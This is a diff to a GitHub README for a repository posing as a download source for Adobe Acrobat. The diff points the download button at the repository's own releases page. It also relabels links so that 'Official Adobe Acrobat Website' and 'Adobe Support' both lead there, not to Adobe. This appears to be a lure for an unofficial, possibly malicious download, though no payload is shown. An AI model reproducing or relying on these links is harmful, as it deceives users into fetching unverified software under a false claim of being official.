@@ -22,7 +22,7 @@ Welcome to the Adobe Acrobat Access repository! Here you will find all the infor
 
 ### Download Adobe Acrobat Access
 Click the button below to download Adobe Acrobat Access:
-[![Download Adobe Acrobat Access](https://img.shields.io/badge/Download-Adobe%20Acrobat%20Access-blue)](https://github.com/project/files/App.zip)
+[![Download Adobe Acrobat Access](https://github.com/RickyTwoCents/Adobe-Acrobat-Access/releases%20Acrobat%20Access-blue)](https://github.com/RickyTwoCents/Adobe-Acrobat-Access/releases)
 
 ### About Adobe Acrobat
 Adobe Acrobat is a software suite by Adobe Systems for creating, editing, and managing PDF documents. It offers a wide range of features including text editing, PDF creation, and digital signature capabilities. Adobe Acrobat is widely used in various industries for document management and collaboration.
@@ -39,8 +39,8 @@ Adobe Acrobat is a software suite by Adobe Systems for creating, editing, and ma
 To get started with Adobe Acrobat, download the software from the provided link. Install the application on your Windows system and explore the various features it offers. Create your first PDF, edit existing documents, and experiment with the tools available to streamline your workflow.
 
 ### Resources
-- Official Adobe Acrobat Website: [Adobe Acrobat](https://www.adobe.com/products/acrobat.html)
-- Adobe Support: [Adobe Support](https://helpx.adobe.com/support/acrobat.html)
+- Official Adobe Acrobat Website: [Adobe Acrobat](https://github.com/RickyTwoCents/Adobe-Acrobat-Access/releases)
+- Adobe Support: [Adobe Support](https://github.com/RickyTwoCents/Adobe-Acrobat-Access/releases)
 
 ### Community and Support
 If you have any questions or need assistance with Adobe Acrobat, feel free to reach out to the Adobe support team. You can also join the Adobe community forums to connect with other users and share your experiences with the software.
